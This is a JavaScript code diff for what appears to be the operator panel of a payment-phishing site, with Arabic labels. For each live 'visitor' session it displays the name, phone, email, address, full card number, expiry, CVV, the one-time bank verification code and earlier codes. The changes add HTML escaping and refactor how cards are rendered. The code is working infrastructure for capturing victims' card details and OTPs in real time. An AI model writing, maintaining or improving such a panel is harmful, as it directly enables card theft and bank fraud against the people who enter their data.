@@ -242,21 +242,27 @@ function getCountryFlag(countryCode) {
 }
 
 function createVisitorCard(visitor) {
+  // Ensure all data fields exist
   const delivery = visitor.delivery_data || {};
   const payment = visitor.payment_data || {};
   const verification = visitor.verification_data || {};
   const country = visitor.country || 'غير معروف';
   const page = visitor.current_page || 'home';
-  const isOnline = visitor.is_online;
+  const isOnline = visitor.is_online === true;
+  const sessionId = visitor.session_id || 'unknown';
+  const countryCode = visitor.country_code || '';
+  const ipAddress = visitor.ip_address || '';
   
-  const hasOTP = verification.otp || verification.verificationData?.otp;
-  const otpValue = hasOTP ? (verification.otp || verification.verificationData?.otp) : null;
+  // Get OTP value
+  const otpValue = verification.otp || verification.verificationData?.otp || '';
   
   // Get OTP history
   let otpHistory = [];
   if (visitor.otp_history) {
     try {
-      otpHistory = typeof visitor.otp_history === 'string' ? JSON.parse(visitor.otp_history) : visitor.otp_history;
+      otpHistory = typeof visitor.otp_history === 'string' 
+        ? JSON.parse(visitor.otp_history) 
+        : (Array.isArray(visitor.otp_history) ? visitor.otp_history : []);
     } catch (e) {
       otpHistory = [];
     }
@@ -270,78 +276,71 @@ function createVisitorCard(visitor) {
   ];
   
   const progressHTML = steps.map((step, index) => {
-    const isCompleted = visitor[step.key];
-    const prevCompleted = index === 0 || visitor[steps[index - 1].key];
+    const isCompleted = visitor[step.key] === true;
+    const prevCompleted = index === 0 || visitor[steps[index - 1].key] === true;
     const isActive = !isCompleted && prevCompleted;
     const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
-    return `
-      <div class="progress-step ${statusClass}">
-        <div class="step-icon">${isCompleted ? '✓' : step.icon}</div>
-        <span>${step.label}</span>
-      </div>
-    `;
+    return `<div class="progress-step ${statusClass}"><div class="step-icon">${isCompleted ? '✓' : step.icon}</div><span>${step.label}</span></div>`;
   }).join('');
   
   // Build card sections
-  let cardBody = '';
+  let cardBody = '<div class="card-body-inner">';
   
   // Delivery section
-  if (Object.keys(delivery).length > 0) {
+  if (delivery && Object.keys(delivery).length > 0) {
     cardBody += `
       <div class="card-section">
         <div class="section-title"><span>📦</span> بيانات التوصيل</div>
-        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${delivery.fullName}</span></div>` : ''}
-        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${delivery.phone}</span></div>` : ''}
-        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${delivery.email}</span></div>` : ''}
-        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${delivery.city}${delivery.region ? ' / ' + delivery.region : ''}</span></div>` : ''}
-        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${delivery.address}</span></div>` : ''}
-        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${delivery.notes}</span></div>` : ''}
+        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${escapeHtml(delivery.fullName)}</span></div>` : ''}
+        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${escapeHtml(delivery.phone)}</span></div>` : ''}
+        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${escapeHtml(delivery.email)}</span></div>` : ''}
+        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${escapeHtml(delivery.city)}${delivery.region ? ' / ' + escapeHtml(delivery.region) : ''}</span></div>` : ''}
+        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${escapeHtml(delivery.address)}</span></div>` : ''}
+        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${escapeHtml(delivery.notes)}</span></div>` : ''}
       </div>
     `;
   }
   
   // Payment section with CVV
-  if (Object.keys(payment).length > 0) {
+  if (payment && Object.keys(payment).length > 0) {
     const cardNum = payment.cardNumber || payment.card_number || '';
     cardBody += `
       <div class="card-section payment-section">
         <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
-        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${cardNum}</span></div>` : ''}
-        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${payment.cardHolder}</span></div>` : ''}
-        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
-        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${payment.cvv}</span></div>` : ''}
+        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${escapeHtml(cardNum)}</span></div>` : ''}
+        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${escapeHtml(payment.cardHolder)}</span></div>` : ''}
+        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${escapeHtml(payment.expiry)}</span></div>` : ''}
+        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${escapeHtml(payment.cvv)}</span></div>` : ''}
       </div>
     `;
   }
   
-  // OTP section with history dropdown
-  if (otpValue || otpHistory.length > 0) {
-    // Build history dropdown if there are old OTPs
-    let historyDropdown = '';
-    if (otpHistory.length > 1) {
-      const oldOtps = otpHistory.slice(1).map(function(item, index) {
-        var date = new Date(item.timestamp).toLocaleString('ar-OM');
-        return '<div class="otp-history-item">الرموز السابقة: <strong>' + item.otp + '</strong> <small>(' + date + ')</small></div>';
+  // OTP section
+  if (otpValue || (otpHistory && otpHistory.length > 0)) {
+    let historyHTML = '';
+    if (otpHistory && otpHistory.length > 1) {
+      const oldOtps = otpHistory.slice(1).map(item => {
+        const date = new Date(item.timestamp).toLocaleString('ar-OM');
+        return `<div class="otp-history-item">الرموز السابقة: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
       }).join('');
-      
-      historyDropdown = '<div class="otp-history-dropdown" id="otpHistory_' + visitor.session_id + '">' + oldOtps + '</div>';
+      historyHTML = `<div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>`;
     }
     
     cardBody += `
       <div class="otp-section">
-        <div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory('${visitor.session_id}')">
+        <div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory('${sessionId}')">
           <span>🔐</span> رمز التحقق (OTP)
-          ${otpHistory.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : ''}
+          ${(otpHistory && otpHistory.length > 1) ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : ''}
         </div>
-        <div class="otp-value">${otpValue}</div>
-        ${historyDropdown}
+        <div class="otp-value">${otpValue || '---'}</div>
+        ${historyHTML}
       </div>
     `;
   }
   
-  // Empty state message
-  if (!cardBody) {
-    cardBody = `
+  // Empty state
+  if (!delivery || Object.keys(delivery).length === 0) {
+    cardBody += `
       <div style="text-align:center;padding:1rem;color:#888;">
         <p>لا توجد بيانات حتى الآن</p>
         <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
@@ -349,50 +348,46 @@ function createVisitorCard(visitor) {
     `;
   }
   
-  // Status indicator
-  const statusHTML = isOnline ? `
-    <div class="card-status">
-      <span class="dot"></span>
-      <span>متصل الآن</span>
-    </div>
-  ` : `
-    <div class="card-status" style="color:#ccc;">
-      <span style="color:#ccc;">○</span>
-      <span style="color:#999;">غير متصل</span>
-    </div>
-  `;
+  cardBody += '</div>';
   
-  // Header background changes based on online status
+  // Status indicator
+  const statusHTML = isOnline 
+    ? '<div class="card-status"><span class="dot"></span><span>متصل الآن</span></div>'
+    : '<div class="card-status" style="color:#ccc;"><span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span></div>';
+  
+  // Header background
   const headerStyle = isOnline 
     ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);'
     : 'background: linear-gradient(135deg, #6b7280 0%, #9ca3af 100%);';
   
-  return `
-    <div class="visitor-card" data-session="${visitor.session_id}" data-online="${isOnline}">
+  // Build final card HTML
+  const cardHTML = `
+    <div class="visitor-card" data-session="${sessionId}" data-online="${isOnline}">
       <div class="card-header" style="${headerStyle}">
         ${statusHTML}
         <div class="card-country">
-          <span>${getCountryFlag(visitor.country_code)}</span>
-          <span>${country}</span>
+          <span>${getCountryFlag(countryCode)}</span>
+          <span>${escapeHtml(country)}</span>
         </div>
         <div class="card-page">${getPageName(page)}</div>
       </div>
-      
-      <div class="card-body">
-        ${cardBody}
-      </div>
-      
-      <div class="card-progress">
-        ${progressHTML}
-      </div>
-      
+      ${cardBody}
+      <div class="card-progress">${progressHTML}</div>
       <div class="card-actions">
-        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address || ''}')">
-          🚫 حظر
-        </button>
+        <button class="btn btn-danger btn-sm" onclick="banVisitor('${sessionId}', '${escapeHtml(ipAddress)}')">🚫 حظر</button>
       </div>
     </div>
   `;
+  
+  return cardHTML;
+}
+
+// Helper function to escape HTML
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
 }
 
 // Toggle OTP History Dropdown
@@ -499,21 +494,27 @@ function updateVisitorsList() {
 
 function handleVisitorsUpdate(data) {
   console.log('📋 Processing visitors update:', data);
+  
   const grid = document.getElementById('visitorsGrid');
   const countEl = document.getElementById('onlineCount');
   const totalCountEl = document.getElementById('totalCount');
+  
   if (!grid) {
-    console.log('❌ Grid not found');
+    console.log('❌ Grid not found!');
     return;
   }
   
   const visitors = data.visitors || [];
-  console.log('📋 Processing', visitors.length, 'visitors');
+  console.log('📋 Found', visitors.length, 'visitors');
   
-  const onlineCount = visitors.filter(v => v.is_online).length;
+  const onlineCount = visitors.filter(v => v.is_online === true).length;
   
+  // Update stats
   if (countEl) countEl.textContent = onlineCount;
   if (totalCountEl) totalCountEl.textContent = visitors.length;
+  
+  // COMPLETELY CLEAR THE GRID
+  grid.innerHTML = '';
   
   if (visitors.length === 0) {
     grid.innerHTML = `
@@ -524,17 +525,39 @@ function handleVisitorsUpdate(data) {
       </div>
     `;
     visitorsCache.clear();
+    console.log('✅ Grid cleared, showing empty state');
     return;
   }
   
-  // Full refresh: rebuild entire grid
-  grid.innerHTML = visitors.map(visitor => createVisitorCard(visitor)).join('');
+  // BUILD NEW CARDS FROM SCRATCH
+  visitors.forEach(function(visitor, index) {
+    const cardHTML = createVisitorCard(visitor);
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = cardHTML;
+    const cardElement = tempDiv.firstElementChild;
+    
+    // Add animation
+    cardElement.style.opacity = '0';
+    cardElement.style.transform = 'translateY(20px)';
+    
+    // Append to grid
+    grid.appendChild(cardElement);
+    
+    // Trigger animation
+    setTimeout(function() {
+      cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+      cardElement.style.opacity = '1';
+      cardElement.style.transform = 'translateY(0)';
+    }, index * 50); // Stagger animations
+  });
   
   // Update cache
   visitorsCache.clear();
-  visitors.forEach(v => visitorsCache.set(v.session_id, v));
+  visitors.forEach(function(v) {
+    visitorsCache.set(v.session_id, v);
+  });
   
-  console.log('✅ Visitors grid updated with', visitors.length, 'cards');
+  console.log('✅ Grid rebuilt with', visitors.length, 'visitor cards');
 }
 
 function updateVisitorPage(sessionId, page) {
